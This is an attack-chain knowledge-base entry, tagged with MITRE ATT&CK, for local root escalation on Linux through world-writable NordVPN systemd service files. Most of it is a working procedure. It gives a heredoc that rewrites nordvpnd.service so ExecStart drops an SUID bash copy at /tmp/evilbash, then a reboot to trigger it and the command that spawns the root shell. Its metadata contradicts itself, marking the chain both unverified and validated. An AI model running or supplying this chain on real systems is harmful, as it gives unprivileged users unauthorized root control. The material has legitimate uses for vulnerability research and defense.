---
tags:
  - privilege-escalation
  - local
  - nordvpn
  - systemd
  - linux
  - suid
type: attack_chain
tools: []
tactics:
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-NordVPN-Client-with-Vulnerable-Permissions]]'
  - '[[procedures/Verify-Clean-System-State]]'
  - '[[procedures/Overwrite-NordVPN-Systemd-Service-File]]'
  - '[[procedures/Trigger-Malicious-Service-Execution-via-Reboot]]'
  - '[[procedures/Execute-SUID-Bash-for-Root-Access]]'
step_count: 6
techniques:
  - '[[Abuse Elevation Control Mechanism]]'
  - '[[Unix Shell]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:30:07.245Z'
description: >-
  Multi-stage attack exploiting world-writable permissions on NordVPN service
  files to overwrite systemd configurations and achieve root access on Linux
  systems.
skill_level: intermediate
impact_level: high
id: d623ad64-b21c-4018-9c38-eb192de930ba
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Abuse Elevation Control Mechanism]]'
  - '[[Unix Shell]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Local Privilege Escalation via Unsafe Permissions in NordVPN Linux Client

The NordVPN Linux client package includes critical service files, such as the systemd unit file /usr/lib/systemd/system/nordvpnd.service, with unsafe world-writable permissions (777 or 666). This allows any local unprivileged user to overwrite these files and modify the ExecStart directive to execute arbitrary commands as root when the service restarts or the system boots. The attack begins with installing the vulnerable package as a privileged user, then exploits the permissions as an unprivileged user to inject a payload that creates an SUID bash binary, leading to full root access.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Vulnerable Package] --> B[Verify Clean State]
    B --> C[Overwrite Service File]
    C --> D[Reboot to Trigger Payload]
    D --> E[Execute SUID Binary]
    E --> F[Root Access Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses built-in Linux utilities like wget, dpkg, apt-get, cat)

### Target Environment

- Linux distribution using Debian package manager (e.g., Ubuntu, Debian)
- systemd init system
- Local unprivileged user access
- Privileged access for initial installation (can be simulated with physical access)

### Initial Access Requirements

- Local user account on the target system
- Ability to run commands as root for package installation (steps 1-2)
- No prior root access needed for exploitation (steps 3-6)

## Detailed Attack Procedures

### Step 1: Add NordVPN Repository and Install Client
procedure: [[procedures/Install-NordVPN-Client-with-Vulnerable-Permissions]]

**Objective**: Install the NordVPN client package, which deploys service files with world-writable permissions, setting up the vulnerability.

**Instructions**: As a privileged user, download and install the repository package, then update and install the client.

Use [[commands/wget-download-nordvpn-release]] to fetch the release deb:

```bash
wget https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb
```

Then install it with [[commands/dpkg-install-release]]:

```bash
sudo dpkg -i nordvpn-release_1.0.0_all.deb
```

Update packages with [[commands/apt-get-update]]:

```bash
sudo apt-get update
```

Finally, install NordVPN using [[commands/apt-get-install-nordvpn]]:

```bash
sudo apt-get install nordvpn
```

**Expected Output**: NordVPN package installed, service files placed with unsafe permissions (verifiable via [[commands/dpkg-list-package-contents]]).

**Success Indicators**:
- Repository added successfully
- NordVPN client installed without errors
- Service files exist in /usr/lib/systemd/system/ with 777 permissions

### Step 2: Verify Clean System State
procedure: [[procedures/Verify-Clean-System-State]]

**Objective**: Confirm no prior malicious artifacts exist in /tmp to ensure a clean baseline before exploitation.

**Instructions**: As an unprivileged user, list files in /tmp.

Run [[commands/ls-list-tmp-files]]:

```bash
ls -la /tmp
```

**Expected Output**: Directory listing showing no /tmp/evilbash or similar SUID files.

**Success Indicators**:
- No SUID binaries present in /tmp
- Clean /tmp directory confirmed

### Step 3: Overwrite Systemd Service File
procedure: [[procedures/Overwrite-NordVPN-Systemd-Service-File]]

**Objective**: Modify the world-writable nordvpnd.service file to inject a malicious ExecStart payload that creates an SUID bash binary.

**Instructions**: As an unprivileged user, use cat with heredoc to overwrite the file.

Execute [[commands/cat-overwrite-service-file]]:

```bash
cat << EOF > /usr/lib/systemd/system/nordvpnd.service
[Unit]
Description=NordVPN Daemon
Requires=nordvpnd.socket
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
NonBlocking=true
KillMode=process
Restart=on-failure
RestartSec=5
# centos7 RuntimeDirectory ignored
RuntimeDirectory=nordvpn
RuntimeDirectoryMode=0770
# User=root
Group=nordvpn

[Install]
WantedBy=default.target
EOF
```

**Expected Output**: File overwritten successfully; contents now include the malicious ExecStart.

**Success Indicators**:
- File permissions allow write (due to 777)
- New contents verifiable with cat /usr/lib/systemd/system/nordvpnd.service

### Step 4: Reboot to Trigger Payload
procedure: [[procedures/Trigger-Malicious-Service-Execution-via-Reboot]]

**Objective**: Restart the system to reload systemd and execute the modified service as root, running the payload.

**Instructions**: Initiate a system reboot (may require privileged access or physical access).

Run [[commands/system-reboot]]:

```bash
sudo reboot
```

**Expected Output**: System reboots; upon startup, the nordvpnd service executes the malicious command as root, creating /tmp/evilbash with SUID.

**Success Indicators**:
- System restarts without errors
- Post-reboot, /tmp/evilbash exists with SUID bit (rwsr-xr-x)

### Step 5: Execute SUID Binary for Root Access
procedure: [[procedures/Execute-SUID-Bash-for-Root-Access]]

**Objective**: Run the created SUID bash to spawn a root shell and verify escalation.

**Instructions**: As unprivileged user, first check the file, then execute it.

Verify with [[commands/ls-check-tmp-suid]]:

```bash
ls -l /tmp
```

Execute the binary using [[commands/execute-suid-bash]]:

```bash
/tmp/evilbash -p
```

Inside the shell, confirm with [[commands/id-verify-root]]:

```bash
id
```

**Expected Output**: SUID file listed with setuid bit; shell prompt changes to root (euid=0); id shows euid=0(root).

**Success Indicators**:
- SUID bash executable found
- Root shell obtained
- id command confirms privilege escalation

## Attack Chain Summary

### Key Achievements

1. Installed vulnerable NordVPN package exposing world-writable service files
2. Overwrote systemd unit to inject root-executed payload
3. Achieved full local root access via SUID binary without additional exploits

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Abuse Elevation Control Mechanism]] Abuse Elevation Control Mechanism
- [[Unix Shell]] Command and Scripting Interpreter: Unix Shell
- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation

---

*Last updated: 2023-10-01T00:00:00Z*
